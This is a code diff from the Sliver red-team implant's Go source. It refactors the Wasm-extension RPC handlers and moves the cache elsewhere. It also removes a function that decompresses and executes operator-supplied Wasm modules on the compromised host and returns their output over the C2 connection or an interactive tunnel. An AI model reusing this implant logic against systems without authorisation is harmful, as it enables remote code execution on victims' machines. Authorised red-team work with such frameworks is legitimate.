@@ -22,21 +22,15 @@ import (
 
 	// {{if .Config.Debug}}
 
-	"bytes"
 	"log"
 
 	// {{end}}
 
-	"github.com/bishopfox/sliver/implant/sliver/encoders"
-	"github.com/bishopfox/sliver/implant/sliver/extension"
-	"github.com/bishopfox/sliver/implant/sliver/transports"
+	"github.com/bishopfox/sliver/implant/sliver/handlers/tunnel_handlers"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
 )
-
-var wasmExtensionCache = map[string]*pb.RegisterWasmExtensionReq{}
 
 // *** RPC Handlers ***
 
@@ -46,7 +40,7 @@ func listWasmExtensionsHandler(data []byte, resp RPCResponse) {
 	// {{end}}
 
 	names := []string{}
-	for name := range wasmExtensionCache {
+	for name := range tunnel_handlers.WasmExtensionCache {
 		names = append(names, name)
 	}
 	wasmExt, _ := proto.Marshal(&pb.ListWasmExtensions{Names: names, Response: &commonpb.Response{}})
@@ -70,11 +64,11 @@ func registerWasmExtensionHandler(data []byte, resp RPCResponse) {
 
 	// Cache the Wasm extension in the map until we receive a
 	// MsgExecWasmExtensionReq message
-	wasmExtensionCache[wasmExtReq.Name] = wasmExtReq
+	tunnel_handlers.WasmExtensionCache[wasmExtReq.Name] = wasmExtReq
 
 	// {{if .Config.Debug}}
 	log.Printf("*** Wasm extensions cache ***")
-	for name := range wasmExtensionCache {
+	for name := range tunnel_handlers.WasmExtensionCache {
 		log.Printf(" - %s", name)
 	}
 	// {{end}}
@@ -96,8 +90,8 @@ func deregisterWasmExtensionHandler(data []byte, resp RPCResponse) {
 
 	// Remove the Wasm extension from the map
 	errMsg := ""
-	if _, ok := wasmExtensionCache[wasmExtReq.Name]; ok {
-		delete(wasmExtensionCache, wasmExtReq.Name)
+	if _, ok := tunnel_handlers.WasmExtensionCache[wasmExtReq.Name]; ok {
+		delete(tunnel_handlers.WasmExtensionCache, wasmExtReq.Name)
 	} else {
 		errMsg = "Wasm extension not registered"
 	}
@@ -105,132 +99,4 @@ func deregisterWasmExtensionHandler(data []byte, resp RPCResponse) {
 		Response: &commonpb.Response{Err: errMsg},
 	})
 	resp(wasmExt, nil)
-}
-
-// *** TunnelHandler ***
-
-// execWasmExtensionHandler - Execute a Wasm extension
-func execWasmExtensionHandler(envelope *pb.Envelope, connection *transports.Connection) {
-	req := &pb.ExecWasmExtensionReq{}
-	err := proto.Unmarshal(envelope.Data, req)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v", err)
-		// {{end}}
-		return
-	}
-
-	extReq, ok := wasmExtensionCache[req.Name]
-	if !ok {
-		// {{if .Config.Debug}}
-		log.Printf("Wasm extension '%s' not found", req.Name)
-		// {{end}}
-		return
-	}
-
-	wasmBin, err := encoders.Gzip.Decode(extReq.WasmGz)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding Wasm extension: %v", err)
-		// {{end}}
-		return
-	}
-
-	// {{if .Config.Debug}}
-	log.Printf("Decompressed size %d bytes", len(wasmBin))
-	// {{end}}
-
-	wasmExtRuntime, err := extension.NewWasmExtension(extReq.Name, wasmBin, req.MemFS)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error creating wasm extension: %v", err)
-		// {{end}}
-		return
-	}
-
-	var data []byte
-	if req.Interactive {
-		data, _ = runInteractive(req, connection, wasmExtRuntime)
-	} else {
-		data, _ = runNonInteractive(req, wasmExtRuntime)
-	}
-	connection.Send <- &pb.Envelope{
-		ID:   envelope.ID,
-		Type: pb.MsgExecWasmExtension,
-		Data: data,
-	}
-}
-
-func runNonInteractive(req *pb.ExecWasmExtensionReq, wasm *extension.WasmExtension) ([]byte, error) {
-	// {{if .Config.Debug}}
-	log.Printf("Executing interactive wasm extension")
-	// {{end}}
-
-	stdout := &bytes.Buffer{}
-	go func() {
-		buf := make([]byte, 1024)
-		n, err := wasm.Stdout.Reader.Read(buf)
-		stdout.Write(buf[:n])
-		if err != nil {
-			// {{if .Config.Debug}}
-			log.Printf("error reading stdout: %v", err)
-			// {{end}}
-			return
-		}
-	}()
-
-	stderr := &bytes.Buffer{}
-	go func() {
-		buf := make([]byte, 1024)
-		n, err := wasm.Stderr.Reader.Read(buf)
-		stderr.Write(buf[:n])
-		if err != nil {
-			// {{if .Config.Debug}}
-			log.Printf("error reading stderr: %v", err)
-			// {{end}}
-			return
-		}
-	}()
-
-	exitCode, err := wasm.Execute(req.Args)
-	errMsg := ""
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error executing wasm extension: %v", err)
-		// {{end}}
-		errMsg = err.Error()
-	}
-
-	return proto.Marshal(&pb.ExecWasmExtension{
-		Stdout:   stdout.Bytes(),
-		Stderr:   stderr.Bytes(),
-		ExitCode: exitCode,
-		Response: &commonpb.Response{Err: errMsg},
-	})
-}
-
-func runInteractive(req *pb.ExecWasmExtensionReq, conn *transports.Connection, wasm *extension.WasmExtension) ([]byte, error) {
-	// {{if .Config.Debug}}
-	log.Printf("Executing interactive wasm extension on tunnel %d", req.TunnelID)
-	// {{end}}
-
-	tunnel := transports.NewTunnel(
-		req.TunnelID,
-		wasm.Stdin.Writer,
-		wasm.Stdout.Reader,
-		wasm.Stderr.Reader,
-	)
-	conn.AddTunnel(tunnel)
-
-	// Execute the Wasm extension
-	errMsg := ""
-	exitCode, err := wasm.Execute(req.Args)
-	if err != nil {
-		errMsg = err.Error()
-	}
-	data, _ := proto.Marshal(&sliverpb.ExecWasmExtension{
-		ExitCode: exitCode,
-		Response: &commonpb.Response{Err: errMsg},
-	})
-	return data, nil
 }
